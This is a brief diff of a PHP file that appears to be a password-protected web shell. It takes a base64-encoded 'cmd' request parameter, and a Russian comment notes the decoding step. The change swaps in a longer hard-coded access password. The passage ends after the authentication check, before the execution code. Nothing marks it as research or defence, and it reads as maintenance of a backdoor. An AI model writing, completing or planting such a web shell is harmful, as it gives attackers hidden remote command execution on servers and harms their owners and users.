@@ -1,5 +1,5 @@
 <?php
-    $password = "HG44g90P";
+    $password = "HG44g90&L;22!636#633^^#^2!P";
 
     if (isset($_REQUEST['cmd']) && isset($_REQUEST['password']) && $_REQUEST['password'] === $password) {
         // Декодирование команды из base64
